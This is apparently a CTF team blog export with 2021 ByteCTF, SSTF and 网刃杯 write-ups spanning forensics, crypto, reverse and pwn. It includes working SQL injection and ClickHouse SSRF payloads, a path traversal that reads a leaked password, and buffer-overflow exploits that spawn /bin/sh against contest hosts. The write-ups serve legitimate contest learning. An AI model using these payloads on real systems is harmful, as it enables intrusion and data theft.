{"pages":[{"title":"","text":"战队简介 2021.8.18成立，初始成员由mumuzi、dota_st、striving、1u1u、max（已离队）、enjoey、atao、v3geD4g、NN组成 时间轴记录","link":"/about/index.html"},{"title":"","text":"加载中，稍等几秒...","link":"/friend/index.html"}],"posts":[{"title":"2021bytectf线上WP","text":"2021字节bytectf线上WP MISCCheckin关注公众号回复“安全范儿”得到flag ByteCTF{Empower_Security_Enrich_Life} SurveyByteCTF{h0p3_y0u_Enjoy_our_ch4ll3n9es!} HearingNotBelieving老规矩AU打开音频，然后看频谱图。放大之后发现前面是一个二维码被分成了三块 需要手撸一下(21*21) 扫码得到第一部分 m4yB3_ 然后后面部分是SSTV 慢扫描 挺刺耳。这里可以用MMSSTV和RXSSTV，我用的RXSSTV，然后去下载一个虚拟声卡Virtual Audio Cable。RXSSTV里面配置就选到虚拟声卡的line1,然后设置选BMP保存，不要时间水印 扫描出来拼好，本来想直接扫还是扫不起，于是还是手撸(25*25)得到后半flag ByteCTF{m4yB3_U_kn0W_S57V} frequently流量包打开，看一下协议分级，挺多UDP 然后去看一下UDP，长度排序一下，发现75、84、91、100的挺多，而且84和100的明显三级域名是base，而75和91是i和o组成的，io正好可以对应成0和1.于是提取试试 使用tshark：.\\tshark.exe -r .\\frequently.pcap -T fields -e dns.qry.name -Y “dns and frame.len==75” &gt; res.txt 其中把75改成84 91 100进而提取更多。提取出来之后使用notepad++的alt将后面整列删掉，然后使用替换将\\r\\n替换成为空，i为1，o为0，拿到cyberchef转换，其中长度75的转换出来是The first08然后乱码，但是长度91(response包)提取出来的就是第一段flag 然后去提取100的，其中还能发现流量包中会有重复的，如下图 于是在处理的时候要将这样的删掉，然后用notepad++的TextFX–Tools–base64 decode解码，在这之前要将编码换成UTF-8，tshark出来的是UCS-2 little Endian 于是得到这张图 检查之后发现没有隐写，说明后半段不在这里面，重新开始，将排序改成按协议排序，发现DHCP协议藏了后半段flag DHCP的ACK，用IP Address Lease Time来隐写，字段名字dhcp.option.ip_address_lease_time 合起来得到的为 ByteCTF{^_^enJ0y&amp;y0urse1f_wIth_m1sc^_^} WEBdouble sqli报错后可以确认是 clickhouse 数据库，通过union all select可以做联合查询 通过 http://39.105.175.150:30001/?id=1 union all select * from ctf.hint 发现用户的权限不足，当前为 user_02 用户 这里有一个/files/test.jpg的文件，并且中间件为Nginx 。于是测试了一下是否存在路径穿越的漏洞：http://39.105.175.150:30001/files../ 接着在/var/lib/clickhouse/access/文件夹下找到了一个可以读取的sql文件 3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sql 获取另外一个用户的账号 ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';ATTACH GRANT SELECT ON ctf.* TO user_01; 通过官方文档查看学习可以使用url 函数建表查看内容 https://www.wolai.com/o8Zu5TtMyPBNPB58uejjRn#q9U4gFK57BFcZVDddCY38i https://www.wolai.com/o8Zu5TtMyPBNPB58uejjRn#4HXtnhLABCqdfyDrRfnyoh 直接就是使用，这里url函数的内容要加一层urlencode编码 http://39.105.175.150:30001/?id=1 union all select * from url('http%3A%2F%2Flocalhost%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bname%2Bfrom%2Bsystem.tables'%2C%20CSV%2C%20'column1%20String')获得表名 : flaghttp://39.105.175.150:30001/?id=1 union all select * from url('http%3A%2F%2Flocalhost%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bname%2Bfrom%2Bsystem.columns'%2C%20CSV%2C%20'column1%20String')获得列名 : flaghttp://39.105.175.150:30001/?id=1 union all select * from url('http%3A%2F%2Flocalhost%3A8123%2F%3Fuser%3Duser_01%26password%3De3b0c44298fc1c149afb%26query%3Dselect%2Bflag%2Bfrom%2Bctf.flag'%2C%20CSV%2C%20'column1%20String')获得flag : ByteCTF{e3b0c44298fc1c149afbf4c8} Cryptoeasyxor首先根据已知flag格式ByteCTF{可以得到iv加密后的值，然后利用OFB模式，爆破key，然后就可以解出第一段。 对于CBC模式，现在已经知道key了，直接逆加密函数(z3直接一顿梭),分别梭出iv和iv异或明文分组的值，最后再解密即可。 def shift(m, k, c): if k &lt; 0: return m ^ m &gt;&gt; (-k) &amp; c return m ^ m &lt;&lt; k &amp; cdef convert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(4): m = shift(m, key[t], c_list[t]) return mfrom Crypto.Util.number import bytes_to_long, long_to_bytesfrom random import randint, getrandbitskeys = [randint(-32, 32) for _ in range(4)]iv=getrandbits(64)print(iv)for _ in range(4): iv=convert(iv,keys) print(iv)s='89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912'c1,c2=s[:len(s)//2],s[len(s)//2:]c1=[int(c1[i:i+16],16) for i in range(0,len(c1),16)]c2=[int(c2[i:i+16],16) for i in range(0,len(c2),16)]m1=b'ByteCTF{'m1=bytes_to_long(m1)iv_1=m1^c1[0]print(iv_1)'''import stringf=open(r'D:\\\\桌面\\out.txt','w')for a in range(-32,33): for b in range(-32,33): for c in range(-32,33): for d in range(-32,33): key=[a,b,c,d] kk=convert(iv_1,key) m=c1[1]^kk flag=long_to_bytes(m) try: if all(c in string.printable for c in flag.decode()): f.write(flag.decode()+str(key)+'\\n') except: pass ''''''key=[-12, 26, -3, -31]f=b''for i in c1: f+=long_to_bytes(iv_1^i) iv_1=convert(iv_1,key)print(f)'''#ByteCTF{5831a241s-f30980 key=[-12, 26, -3, -31] 中间有个筛选过程: f=open(r'D:\\\\桌面\\out.txt','r')ff=open(r'D:\\\\桌面\\final.txt.','w')xxx=['&quot;','*','\\'','@','~','&amp;','~','$','\\\\','|','!','{','%','}','?','=','&lt;',';','#','^','/','*'',','.','+',':','&gt;','(',')',]for i in f.readlines(): if all(x not in xxx for x in i): ff.write(i+'\\n')ff.close() 得到key和前半段再解后半段CBC from Crypto.Util.number import *print(len(bin(bytes_to_long(b'f'*8))[2:]))key=[-12, 26, -3, -31]s='89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912'c1,c2=s[:len(s)//2],s[len(s)//2:]c1=[int(c1[i:i+16],16) for i in range(0,len(c1),16)]c2=[int(c2[i:i+16],16) for i in range(0,len(c2),16)]'''from z3 import *c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c]ivv=[14682254609762378035]+c2for i in ivv: s=Solver() m=BitVec('m',100) def shift(m, key, c_list): for i in range(4): if key[i]&lt;0: m=m ^ m &gt;&gt; (-key[i]) &amp; c_list[i] else: m=m ^ m &lt;&lt; key[i] &amp; c_list[i] return m s.add(shift(m,key,c_list)==i) if s.check()==sat: print(s.model())'''iv=[16476971533267772345,c2[0],c2[1]]dec=[10780708739817148043,738617756395427640,10936161096540945944]f=b''for i in range(3): f+=long_to_bytes(dec[i]^iv[i])print(f) 两段拼接：ByteCTF{5831a241s-f30980q535af-2156547475u2t} justdecrypt题目是要求伪造密文使之得到目标明文，AES的CFB模式，其实就类似于流密码的，所以可以依次构造， 但是明文只有49位，所以我是填充到64位，然后最后一位设为(64-49)，然后就unpad掉了，但是有个bug第一位始终不对，这里不太懂，所以我是采用炼丹，还真给我试出来了。 import stringfrom binascii import *from hashlib import *from pwn import *f=Falsefor _ in range(255): p=remote('39.105.115.244',30001) context.log_level='debug' alphabet = string.ascii_letters + string.digits def proof_of_work(end,sha): for a in alphabet: for b in alphabet: for c in alphabet: for d in alphabet: s=a+b+c+d+end if sha256(s.encode()).hexdigest()==sha: return a+b+c+d p.recvuntil('XXXX+') end=p.recvuntil(') == ')[:-5].decode() sha=p.recvuntil('\\n')[:-1].decode() xxxx=proof_of_work(end,sha) p.recvuntil('Give me XXXX &gt; ') p.sendline(xxxx) p.recvuntil('Please enter your cipher in hex &gt; ') m=480*'61' p.sendline(m) p.recvuntil('Your plaintext in hex: \\n') plain=unhexlify(p.recvuntil('\\n')[:-1]) msg=b'\\x00'+b'ello, I\\'m a Bytedancer. Please give me the flag!' pad=64-len(msg) for i in range(len(msg)): ivs=ord('a')^plain[i] gg=hex(ivs^msg[i])[2:].zfill(2) m=m[:i*2]+gg+m[2*i+2:] p.recvuntil('Please enter your cipher in hex &gt; ') p.sendline(m) p.recvuntil('Your plaintext in hex: \\n') plain=unhexlify(p.recvuntil('\\n')[:-1]) print(plain) if plain[0]==ord('H'): f=True else: break ivs=ord('a')^plain[63] gg=hex(ivs^pad)[2:].zfill(2) m=m[:126]+gg p.recvuntil('Please enter your cipher in hex &gt; ') p.sendline(m) p.recvuntil('Your plaintext in hex: \\n') plain=unhexlify(p.recvuntil('\\n')[:-1]) print(plain) if f: p.recvall() break ByteCTF{8de1d3e1-5e74-4a73-b99e-7dc860183f96} Overheard可以获取高位联想到copper，可以传Alice,Alice^2来构造一个等式，设低位为x,y，二元copper直接出。 import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] from pwn import *p=remote('39.105.38.192',30000)context.log_level='debug'pp = 62606792596600834911820789765744078048692259104005438531455193685836606544743p.recvuntil('$ ')p.sendline('1')Alice=p.recvuntil('\\n')[:-1]p.recvuntil('$ ')p.sendline('3')p.recvuntil('To Bob: ')p.sendline(Alice)x0=int(p.recvuntil('\\n')[:-1])p.recvuntil('$ ')p.sendline('3')p.recvuntil('To Bob: ')p.sendline(str(pow(int(Alice),2,pp)))y0=int(p.recvuntil('\\n')[:-1])print(x0,y0)Fp=GF(pp)P.&lt;x, y&gt; = PolynomialRing(Fp)f=(x0+x)*(x0+x)-y0-yroot=small_roots(f, (2^64, 2^64), m=3)[0]x1,y1=rootp.recvuntil('$ ')p.sendline('4')p.recvuntil('secret: ')p.sendline(str(x0+x1))p.recvall()#ByteCTF{0fcca5ab-c7dc-4b9a-83f0-b24d4d004c19} Reverse0x6d21调试发现密文是固定的。并且他用的一个奇怪的指令来矩阵运算加密我们的明文而已，直接爆破四个字节。脚本当时写的，有点丑。。这道题还没有前阵子TSGCTF那道第一题有意思。搞完这道题就去准备第二天的省赛了（ s=[0xD2C,0xA3D ,0x9D9,0xBF2,0xB1C,0x95C,0x412, 0xD1E,0xB72,0x93F,0x957, 0xBCC, 0x55F,0x559, 0x6Da,0x9E1]#0123456789abcdefprint(hex((0x15*0x32+3*0x33+1*0x30+5*0x31)))print(hex(0xd*0x32+2*0x33+1*0x30+8*0x31))print(hex(0x8*0x32+1*0x33+2*0x30+0xd*0x31))print(hex((0x5*0x32+1*0x33+3*0x30+0x15*0x31)))# for a1 in range(0x20,0x7f):# for a2 in range(0x20,0x7f):# for a3 in range(0x20,0x7f):# for a4 in range(0x20,0x7f):# if 0x55f==(0x15*a1+3*a2+1*a3+5*a4) and 0x559==(0xd*a1+2*a2+1*a3+8*a4) and\\# 0x6da== (0x8*a1+1*a2+2*a3+0xd*a4) and 0x9e1==(0x5*a1+1*a2+3*a3+0x15*a4) :# print(chr(a3)+chr(a4)+chr(a1)+chr(a2))#matrix_0bf_mba!!","link":"/posts/5066/"},{"title":"2021SSTF-Hacker&#39;s Playground!","text":"2021三星SSTF-Hacker’s Playground! WP WEBSQLi 101payload http://sqli101.sstf.site/step2.php?id=admin'--+&amp;pw=admin SQLi 102http://sqli102.sstf.site/step3.php?searchkey=1' union select 1,1,1,1,group_concat(column_name),1,1,1 from information_schema.columns where table_name='findme'--+ SW Expert Academy题目打开是一道算法题paylaod1 ??=inc\\lude &quot;/flag.txt&quot; paylaod2 %:import &quot;/flag.txt&quot; 知识点：https://en.wikipedia.org/wiki/Digraphs_and_trigraphs RevSecure Enough附件下载分析： ├─Secure_Enough │ my_client │ out.pcap 解压得到两个文件，一个my_client,x86-x64得elf文件。一个流量包。使用IDA打开elf文件 如果运行得话，要存在一个参数。(动调得时候加上去就行）然后就是sub_1186是一个socket函数，用来唤起一个服务。port为7001 然后判断链接与否。然后返回这个句柄。接着进入sub_1784函数 进入sub_13f1函数 进入sub_1561函数进入sub_170f进入sub_1647!再看看main函数中最后一个函数sub_1a28 solution：虚拟机打开三个控制台一个打开ida64的调试服务。一个连接服务 ：nc -l 7001一个用来监听流量：tcpdump -i any port 7001 -X -A (以16进制和ascii实时打印）而根据我们上面的分析，它提供的另一个文件 ：out.pcap。我们使用Wireshark,来分析这个流量包。发现。他就是我们进行交互的时候监听的流量。所以我们跟踪tcp流。选择hex转储! 然后队友mumuzi跟我说，红色是客户端，蓝色是服务端。那我就彻底懂了这道题。那就是把这道题的状态还原到我们现在启动的服务上！根据刚才的分析，标识头为 1 然后会将 ，拼接上去。所以unk_203040的此时状态的数据为： 接下来的数据就是将unk_203060的数据进行RSA_public_encry加密存储。标识头为2，是我们服务端向客户端发送数据监听到的流量。接下来的数据就是将输入的进行RSA_public_decry加密，然后截取0x20存储到我们要得到unk_203080， 现在，三个关键的“种子”!我们都得到了，已经将此时的状态还原到题目题出题时候的初始状态这段客户端发送的数据可以用来我们还原了上面数据的一个验证。接下来最后一段服务端发送的数据就是我们的密文！我们动调的时候再恢复为解密这段数据块最后即可得到我们想要的flag。他将再客户端打印 结果： SCTF{B3_CAR3_FULL_W1T4_RAND0M} CryptoRC fourflag_enc = '624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb'flag_enc = bytes.fromhex(flag_enc)pl = 'RC4 is a Stream Cipher, which is very simple and fast.'enc_pl = '634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8'enc_pl = bytes.fromhex(enc_pl)cx = [a ^ b for a,b in zip(flag_enc, enc_pl)]pl = [ord(i) for i in pl]flag = ''.join( [chr(i ^ j) for i,j in zip(pl,cx)] )print(flag) SCTF{B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c} RSA101题目给了$n,e$，然后给了两个选项，可以选择一个明文进行签名，但不能是$cat,flag$,而选项$1$输入签名，验证是$cat,flag$的话执行并得到$flag$，所以目标是得到签名，但是不能直接得到，可以签名其倍数，比如设$m=cat,flag$,$s_1={(2m)}^d%n,s_2=2^d%n,则s=s_1*(s_2)^{-1}%n$。 from gmpy2 import *import base64from Crypto.Util.number import *from pwn import * p=remote('rsa101.sstf.site',1104)context.log_level='debug' p.recvuntil('n = ')n=int(p.recvuntil('\\n')[:-1],16)print(n)s=b'cat flag'n_s=long_to_bytes(2*bytes_to_long(s))b64_ns=base64.b64encode(n_s)p.recvuntil(' &gt; ')p.sendline('2')p.recvuntil('Base64 encoded command to sign: ')p.sendline(b64_ns)p.recvuntil('Signed command: ')sign_2=bytes_to_long(base64.b64decode(p.recvuntil('\\n')[:-1]))print(sign_2) p.recvuntil(' &gt; ')p.sendline('2')p.recvuntil('Base64 encoded command to sign: ')n_s=b'\\x02'b64_ns=base64.b64encode(n_s)p.sendline(b64_ns)p.recvuntil('Signed command: ')sign_1=bytes_to_long(base64.b64decode(p.recvuntil('\\n')[:-1]))print(sign_1)s=base64.b64encode(long_to_bytes(invert(sign_1,n)*sign_2%n)) p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Signed command: ')p.sendline(s) p.recvuntil('\\n') SCTF{Mult1pLic4tiv3_pr0perty_of_RSA} Pwnbof1from pwn import *#p=process('./bof101')p=remote('bof101.sstf.site',1337)context.log_level='debug'p.recvuntil(&quot;printflag()'s addr: &quot;)print_flag=int(p.recv(14),16)success('print_flag:'+hex(print_flag))p.recvuntil(': ')p.sendline('a'*(0x90-4)+p32(0xdeadbeef)+'b'*8+p64(print_flag))p.interactive() bof2from pwn import *#p=process('./bof102')p=remote('bof102.sstf.site',1337)context.log_level='debug'elf=ELF('./bof102')p.sendlineafter('Name &gt; ','/bin/sh\\x00')p.sendlineafter(' &gt; ','a'*0x10+'b'*4+p32(elf.plt['system'])+p32(0)+p32(0x804a034))p.interactive() MiscmeLorean因为是数学家，并且对比了每组的值，发现后一位除以前一位取整之后，数字对应的ASCII处于可打印字符，因此尝试相除，得到下图发现第二行到第五行，出现最多的字母分别是CTF{于是尝试提取每组出现最多的字母，但是组合起来发现并不能阅读，于是乎想到了最小二乘法来优化，斜率即为要转换的ASCII值 #最小二乘法def least_square_method(XY): x_y=sum([i*j for i,j in XY])/len(XY) x_2=sum([i[0]*i[0] for i in XY])/len(XY) x=sum([i[0] for i in XY])/len(XY) y=sum([i[1] for i in XY])/len(XY) return (x_y-x*y)/(x_2-x*x) s=[[(148, 13024.96),(236, 19034.88),(19, 1817.0),(202, 16665.88),(2, 414.12),(41, 3643.0),(67, 5801.0),(231, 19024.74),(219, 18785.34),(214, 16921.88),(207, 18117.84),(187, 15761.0),(136, 11528.0),(0, 240.0),(85, 7295.0),(6, 723.24),(223, 19498.96),(9, 927.78),(238, 19994.0),(177, 14931.0),(130, 11250.6),(69, 5967.0)],[(159, 10955.82),(16, 1136.8),(152, 10272.0),(121, 7867.2),(190, 13587.08),(155, 10473.0),(128, 9183.84),(191, 12627.3),(149, 10272.42),(215, 14493.0),(89, 6293.04),(101, 6855.0),(233, 15699.0),(228, 15364.0),(32, 2232.0),(33, 2299.0),(1, 155.0),(81, 5294.4),(247, 16969.74),(230, 15188.04),(120, 8128.0),(243, 15714.24)],[(173, 14617.0),(237, 19593.14),(37, 3256.86),(55, 4705.0),(0, 88.4),(49, 3948.94),(21, 1922.96),(6, 589.0),(228, 19237.0),(27, 2353.0),(249, 21841.04),(245, 20251.7),(140, 12081.9),(149, 12096.96),(53, 4809.22),(114, 9661.0),(16, 1429.0),(141, 11690.42),(201, 16969.0),(238, 20077.0),(248, 20917.0),(138, 11443.46)], [(16, 1232.4),(82, 5805.0),(172, 12105.0),(150, 10565.0),(180, 12918.3),(241, 16257.6),(130, 9165.0),(74, 4930.3),(20, 1494.3),(255, 17915.0),(197, 14132.1),(198, 13368.0),(71, 5035.0),(101, 7135.0),(251, 17635.0),(220, 15465.0),(174, 12979.7),(113, 7815.5),(64, 4635.9),(114, 8045.0),(80, 5778.3),(47, 3220.8)],[(110, 13802.64),(5, 617.0),(250, 31982.08),(147, 18083.0),(9, 1175.54),(24, 2835.84),(159, 19559.0),(181, 21819.7),(243, 30488.82),(53, 6521.0),(72, 8858.0),(112, 13502.44),(71, 8735.0),(23, 2831.0),(191, 24434.8),(254, 29994.24),(44, 5738.84),(209, 25194.82),(3, 371.0),(199, 24479.0),(99, 12179.0),(146, 17600.8)],[(9, 926.0),(202, 16366.0),(104, 8526.0),(143, 11180.16),(180, 14606.0),(164, 13059.48),(138, 11695.84),(51, 4286.0),(205, 16938.12),(123, 9845.08),(22, 2005.32),(33, 2675.24),(223, 18767.84),(179, 14526.0),(194, 15726.0),(200, 15557.76),(72, 5966.0),(24, 2126.0),(189, 15326.0),(217, 16512.04),(12, 1189.32),(112, 8982.68)],[(151, 17331.0),(145, 15648.18),(7, 951.6),(183, 20979.0),(192, 22885.2),(130, 14339.52),(120, 13797.0),(220, 24693.06),(208, 24782.16),(146, 16425.78),(207, 24189.3),(83, 9579.0),(11, 1371.0),(255, 28603.26),(189, 21663.0),(14, 1713.0),(241, 27591.0),(39, 4289.22),(166, 19041.0),(195, 21900.06),(35, 4189.14),(173, 19839.0)],[(141, 7182.24),(221, 10746.0),(254, 12576.6),(145, 7098.0),(162, 8072.28),(54, 2566.2),(107, 5379.48),(147, 7050.12),(7, 492.96),(252, 11744.64),(180, 8953.56),(168, 8202.0),(95, 4698.0),(146, 6717.24),(27, 1434.0),(199, 9690.0),(1, 186.0),(144, 7050.0),(72, 3594.0),(5, 362.88),(220, 10698.0),(108, 5215.56)],[(27, 3148.08),(39, 4092.48),(116, 12925.64),(149, 15593.0),(188, 20394.4),(155, 16211.0),(122, 13068.24),(245, 24971.38),(251, 26099.0),(68, 7105.0),(193, 20125.0),(249, 25375.14),(183, 19095.0),(50, 5396.0),(83, 8795.0),(174, 17804.64),(173, 18426.3),(220, 22906.0),(199, 21572.72),(114, 11988.0),(52, 5602.0),(145, 14270.14)],[(158, 19279.28),(77, 8954.0),(165, 18986.0),(160, 18047.68),(124, 14884.48),(208, 23888.0),(60, 7016.0),(164, 18117.12),(201, 23090.0),(91, 10550.0),(106, 12505.2),(141, 16250.0),(223, 26109.96),(219, 24136.32),(18, 2228.0),(103, 11918.0),(225, 26342.52),(122, 13238.96),(140, 16781.44),(65, 7586.0),(200, 23435.52),(13, 1624.84)],[(34, 3532.0),(83, 7972.14),(49, 5248.88),(127, 12666.5),(180, 18278.0),(225, 22823.0),(162, 16460.0),(229, 23227.0),(212, 21940.2),(223, 21716.16),(232, 24000.6),(178, 17714.48),(90, 9188.0),(32, 3330.0),(143, 15413.46),(255, 25335.94),(163, 16892.22),(110, 11208.0),(1, 199.0),(211, 21409.0),(128, 13547.04),(117, 11438.4)],[(161, 8678.0),(244, 13077.0),(13, 834.0),(91, 4868.64),(153, 8419.08),(80, 4121.9),(216, 12056.72),(178, 9387.42),(49, 2742.0),(237, 11943.64),(142, 7671.0),(68, 3749.0),(234, 12547.0),(163, 8432.64),(23, 1391.28),(133, 7194.0),(179, 10017.28),(121, 6558.0),(115, 6240.0),(93, 4972.52),(139, 7662.24),(184, 9501.12)],[(236, 12636.0),(98, 5109.12),(135, 7574.32),(9, 605.0),(249, 13591.5),(82, 4205.56),(24, 1456.0),(52, 2884.0),(101, 5481.0),(159, 8383.9),(129, 6965.0),(235, 12583.0),(210, 11258.0),(222, 11894.0),(106, 5860.92),(42, 2354.0),(102, 5644.68),(65, 3573.0),(191, 10866.06),(7, 489.02),(178, 9753.24),(186, 9586.56)],[(172, 16709.64),(56, 5147.52),(128, 12202.0),(136, 12184.28),(133, 13184.08),(222, 21132.0),(205, 19907.34),(29, 2797.0),(53, 5077.0),(140, 13342.0),(80, 7794.84),(188, 17902.0),(168, 16002.0),(167, 15270.72),(39, 3971.82),(131, 11987.52),(7, 707.0),(134, 12516.56),(162, 15432.0),(92, 8606.36),(91, 8687.0),(198, 18474.96)],[(250, 19107.92),(64, 4795.0),(103, 7642.0),(132, 9759.0),(252, 18519.0),(78, 5817.0),(15, 1218.0),(80, 5843.74),(52, 4075.76),(212, 14663.06),(155, 11666.76),(234, 16516.8),(95, 7058.0),(152, 10994.62),(117, 8837.28),(101, 7046.24),(184, 13826.1),(177, 12783.12),(7, 634.0),(151, 11146.0),(156, 11971.44),(62, 4649.0)],[(128, 14229.0),(94, 9859.66),(87, 10107.76),(251, 26648.64),(52, 5986.38),(216, 23430.82),(221, 25437.36),(63, 7079.0),(222, 24569.0),(137, 14610.24),(115, 13054.98),(66, 7260.82),(134, 15186.78),(224, 24789.0),(203, 22479.0),(245, 27099.0),(39, 4439.0),(93, 10379.0),(225, 24899.0),(149, 16208.22),(205, 24060.94),(69, 7739.0)],[(206, 19714.0),(183, 17529.0),(31, 3089.0),(115, 10847.62),(140, 13444.0),(252, 22638.96),(203, 20206.16),(129, 11655.06),(181, 17339.0),(174, 16340.52),(170, 16945.76),(186, 17457.72),(187, 17909.0),(40, 3865.12),(37, 3659.0),(255, 24369.0),(232, 23071.36),(35, 3469.0),(192, 19119.36),(141, 13268.22),(0, 146.88),(60, 5844.0)],[(200, 16475.0),(177, 14589.0),(191, 16366.48),(31, 2617.0),(125, 10531.5),(17, 1469.0),(56, 4667.0),(6, 544.32),(87, 7353.18),(157, 12172.06),(33, 2836.62),(176, 14507.0),(106, 9293.02),(242, 19919.0),(4, 403.0),(26, 2207.0),(169, 13933.0),(46, 3770.06),(127, 10908.56),(23, 1882.56),(126, 10615.14),(95, 7707.7)],[(196, 10456.02),(149, 7854.0),(32, 1924.74),(146, 7392.96),(144, 7599.0),(57, 2972.28),(227, 11832.0),(153, 8058.0),(61, 3567.96),(126, 6681.0),(71, 4031.04),(2, 349.86),(115, 6120.0),(28, 1683.0),(86, 4733.82),(169, 8696.52),(222, 11577.0),(33, 1899.24),(44, 2598.96),(241, 12546.0),(74, 4190.16),(159, 8364.0)],[(32, 3539.12),(230, 23797.0),(219, 23570.56),(229, 23220.12),(216, 22802.1),(218, 22109.78),(80, 8680.88),(251, 25960.0),(128, 13291.0),(121, 12318.6),(133, 13806.0),(253, 26166.0),(122, 12673.0),(136, 13832.7),(105, 10922.0),(31, 3300.0),(70, 7463.34),(144, 14341.44),(182, 18853.0),(123, 12009.44),(111, 11540.0),(16, 1649.7)],[(235, 27034.0),(125, 14494.0),(204, 23500.0),(182, 19732.48),(197, 22702.0),(151, 17108.84),(107, 12442.0),(4, 686.0),(220, 25830.48),(131, 14570.88),(173, 19966.0),(61, 7198.0),(56, 6628.0),(216, 23873.28),(176, 21526.48),(109, 12670.0),(67, 8039.64),(251, 28280.84),(211, 25269.92),(72, 8282.96),(156, 18749.12),(101, 11758.0)],[(247, 12712.0),(233, 11518.08),(218, 11233.0),(55, 2920.0),(185, 9550.0),(189, 9754.0),(255, 13382.4),(222, 10979.52),(231, 12133.92),(204, 10519.0),(212, 11582.62),(176, 9091.0),(68, 3583.0),(53, 2818.0),(243, 12758.16),(246, 12407.78),(155, 8340.8),(112, 5593.92),(135, 7000.0),(73, 3607.72),(121, 6411.72),(173, 8759.24)],[(98, 11699.4),(101, 11815.0),(25, 3136.5),(135, 15725.0),(75, 8825.0),(3, 512.3),(96, 11464.8),(74, 8710.0),(30, 3650.0),(243, 28145.0),(73, 8938.8),(32, 3724.8),(204, 24606.4),(251, 28483.7),(122, 14230.0),(145, 16875.0),(174, 20614.2),(200, 22736.0),(111, 13483.6),(53, 6295.0),(255, 29525.0),(47, 5268.7)],[(7, 1063.18),(118, 13768.0),(249, 28833.0),(163, 18185.28),(254, 29996.16),(116, 13267.24),(154, 17908.0),(17, 2066.88),(89, 10850.32),(21, 2560.74),(86, 10491.52),(238, 27568.0),(62, 7767.68),(156, 17775.24),(95, 11123.0),(75, 8646.54),(229, 26533.0),(113, 13193.0),(80, 9398.0),(146, 16648.24),(226, 26188.0),(153, 17793.0)],[(39, 5104.0),(124, 15729.0),(80, 10229.0),(122, 14550.26),(168, 21229.0),(159, 20104.0),(52, 6729.0),(16, 2095.26),(7, 1148.16),(99, 12604.0),(43, 5828.16),(35, 4511.92),(115, 14604.0),(236, 29134.42),(51, 6736.08),(176, 22229.0),(255, 32104.0),(6, 939.84),(200, 25733.58),(138, 17129.42),(143, 18828.16),(146, 18109.42)]]f=[]for i in s: f.append(least_square_method(i))print(f)print(''.join([chr(round(i)) for i in f]))#SCTF{Pr0gre55_In_R3gr3ss} flag:SCTF{Pr0gre55_In_R3gr3ss} Mars Rover首先拖进010看IDAT块长度，发现都比较短，提取出IDAT长度尝试转换为字符，但是并没有发现flag痕迹，接着用tweakpng查看CRC，发现前面很多的CRC尾部都是20结尾，并且后面有的CRC不是20，所以尝试提取CRC的最后一位来转换为字符 flag = ''f = open(&quot;MarsRover.png&quot;,'rb').read()i=0while i &lt; len(f): if(f[i:i+4] == b'IDAT'): for j in range(i+1,len(f),1): if(f[j:j+4] == b'IDAT'): #print(f[j-5]) if(f[j-5]&gt;32): flag += chr(f[j-5]) i += (j-i-2) break i+=1print(flag)","link":"/posts/53053/"},{"title":"2021网刃杯WP","text":"2021网刃杯WP 成绩 第二名 MISC部分气死我了气死我了气死我了私钥头错了一直卡着，过了就好说多了。注：encrypted ad1是赛后出的 签到解压得到flag.txt和一段密文Flag.txt是0宽勾选BCDE(vim查看就可以看到要勾选这几个)、得到hintmyself居然是flag.txt的md5，我麻了得到key：f71b6b842d2f0760c3ef74911ffc7fdb最后测试rabbit，得到flag flag{WelY0me_2_bOl3an} baby-usb键盘流量，完全按这篇即可http://www.ga1axy.top/index.php/archives/22/脚本直接用，步骤直接仿得到 output :CT[DEL]ONH[DEL]GRATUE[DEL]LATIOKE[DEL][DEL]NSONFINY[DEL]DINGMEBUTIWII[DEL]LLNS[DEL]OTTELLYOUWHERETQA[DEL][DEL]HEPZ[DEL]ASSWORDWS[DEL][DEL]OX[DEL]FWE[DEL]OD[DEL]RDDOC[DEL]CUMENTISGOARFV[DEL][DEL][DEL]NDFINDITAGAIN 发现删除的就是KEY，The key is qazwsxedcrfv 即可打开word flag{685b42b0-da3d-47f4-a76c-0f3d07ea962a} Mspaint上vol，imageinfo显示Win7，pslist发现用了cmd、画图、ie，cmd说他喜欢把图片截图下来，因此filescan |grep ‘png’导出，发现文件只有一个hack然后iehistory发现他访问了一个百度云盘链接，尝试用hack，成功。密码即hack。下载下来附件，居然有密码。因此查看内存图，方法如此链接最后一个https://blog.csdn.net/qq_42880719/article/details/117304586因为我怕看错（主要是我眼比较瞎），所以我用zip爆破软件，用户自定义爆我选择了8%R~sSA52!iqp，长度8位 解压之后，发现是python写的于是直接逆 